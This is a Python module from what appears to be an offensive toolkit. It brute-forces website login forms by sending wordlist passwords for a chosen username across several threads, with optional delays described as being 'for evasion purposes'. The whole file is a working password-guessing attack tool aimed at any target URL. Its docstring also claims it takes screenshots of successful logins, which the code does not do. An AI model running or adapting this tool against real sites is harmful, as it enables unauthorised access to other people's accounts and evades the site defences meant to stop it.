"""
Form Authentication Bruteforce Module

This module is capable of bruteforcing web form authentication methods
with screenshots of successful logins and delayed timeouts for evasion purposes.

"""
import requests
from threading import Thread
import sys
import time
import getopt
import re
from termcolor import colored
from time import sleep
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities

class Module:
    """
    Module Class
    """

    __title__ = 'auxiliary.form_auth'
    __date__ = '2017-11-18'
    __rank__ = 'normal'
    __description__ = 'This is a website login form authentication bruteforce module.'
    __details__ = 'None'

    __author__ = 'Intrukit'

    def __init__(self, DICTIONARY='resources/wordlist/pass.txt', URL=None,
                 USERNAME='admin', THREADS=5, PAYLOAD='username=admin&password=FUZZ', DELAY=None, HIDECODE='000'):
        """
        __init__(self, DICTIONARY='resources/wordlist/pass.txt', URL=None,
                 USERNAME='admin', THREADS=5, PAYLOAD='username=admin&password=FUZZ', DELAY=1, HIDECODE='000')

        :param URL: 
        :param USERNAME: 
        :param THREADS: 
        :param PAYLOAD:  
        :param DELAY:  
        :param HIDECODE:  

        Initialize the module with the module's desired options
        """
        self.__dict__['DICTIONARY'] = {"value": DICTIONARY, "required": True, "description": "Password dictionary file"}
        self.__dict__['URL'] = {"value": URL, "required": True,
                                "description": "URL of the target authentication method"}
        self.__dict__['USERNAME'] = {"value": USERNAME, "required": True, "description": "Username to attack"}
        self.__dict__['THREADS'] = {"value": THREADS, "required": True, "description": "Number of threads"}
        self.__dict__['PAYLOAD'] = {"value": PAYLOAD, "required": True, "description": "Query string payload"}
        self.__dict__['DELAY'] = {"value": DELAY, "required": False, "description": "Delay in seconds"}
        self.__dict__['HIDECODE'] = {"value": HIDECODE, "required": False, "description": "Hide char code"}

    def run(self):
        """
        run(self)

        :return: 

        Run the module
        """
        if self.DICTIONARY['value'] and self.URL['value'] and self.USERNAME['value'] \
                and self.THREADS['value'] and self.PAYLOAD['value']:
            c_history = []
            class request_performer(Thread):
                def __init__(self, word, url, hidecode, payload, delay):
                    Thread.__init__(self)
                    self.word = word.split("\n")[0]
                    self.url = url.replace('FUZZ', self.word)
                    if payload != "":
                        self.payload = payload.replace('FUZZ', self.word)
                    else:
                        self.payload = payload
                    self.hidecode = hidecode
                    self.delay = delay

                def run(self):
                    if self.delay:
                        sleep(int(self.delay))

                    start = time.time()
                    if self.payload == "":
                        r = requests.get(self.url)
                        elaptime = time.time()
                        totaltime = str(elaptime - start)[1:10]
                    else:
                        list = self.payload.replace("=", " ").replace("&", " ").split(" ")
                        payload = dict([(k, v) for k, v in zip(list[::2], list[1::2])])
                        r = requests.post(self.url, data=payload)
                        elaptime = time.time()
                        totaltime = str(elaptime - start)[1:10]

                    lines = str(r.content.decode('utf-8').count("\n"))
                    chars = str(len(r._content.decode('utf-8')))
                    words = str(len(re.findall("\S+", r.content.decode('utf-8'))))
                    code = str(r.status_code)

                    if r.history != []:
                        first = r.history[0]
                        code = str(first.status_code)
                    else:
                        pass

                    if str(self.hidecode) != str(chars):

                        color = None
                        if c_history == []:
                            color = 'white'
                        elif chars not in c_history:
                            color = 'green'
                        else:
                            color = 'white'

                        if '200' <= code < '300':
                            print(totaltime + "\t" + colored(code,
                                                             'green') + "   \t\t" + colored(chars, color) + " \t\t" + words + " \t\t " + lines + "\t" +
                                  r.headers["server"] + "\t" + self.word)
                        elif '400' <= code < '500':
                            print(totaltime + "\t" + colored(code,
                                                             'red') + "   \t\t" + colored(chars, color) + " \t\t" + words + " \t\t " + lines + "\t" +
                                  r.headers["server"] + "\t" + self.word)
                        elif '300' <= code < '400':
                            print(totaltime + "\t" + colored(code,
                                                             'blue') + "   \t\t" + colored(chars, color) + " \t\t" + words + " \t\t " + lines + "\t" +
                                  r.headers["server"] + "\t" + self.word)
                    else:
                        pass

                    c_history.append(chars)
                    i[0] = i[0] - 1  # Here we remove one thread from the counter

            def start(words, threads, url, hidecode, payload, delay):
                try:
                    f = open(words, "r")
                    words = f.readlines()
                except:
                    print("Failed opening file: " + words + "\n")
                    sys.exit()
                launcher_thread(words, threads, url, hidecode, payload, delay)

            def launcher_thread(names, th, url, hidecode, payload, delay):
                global i
                i = []
                resultlist = []
                i.append(0)
                print(
                    "-----------------------------------------------------------------------------------------------------------------------------------")
                print("Time" + "\t" + "\t code \t\tchars\t\twords\t\tlines")
                print(
                    "-----------------------------------------------------------------------------------------------------------------------------------")
                while len(names):
                    try:
                        if i[0] < int(th):
                            n = names.pop(0)
                            i[0] = i[0] + 1
                            thread = request_performer(n, url, hidecode, payload, delay)
                            thread.start()

                    except KeyboardInterrupt:
                        print("Interrupted  by user. Finishing attack..")
                        sys.exit()
                    thread.join()
                return

            try:
                start(self.DICTIONARY['value'], self.THREADS['value'], self.URL['value'],
                      self.HIDECODE['value'], self.PAYLOAD['value'], self.DELAY['value'])
            except KeyboardInterrupt:
                print("Interrupted by user, killing all threads!")
        else:
            print("You are missing required options. Please see: show options")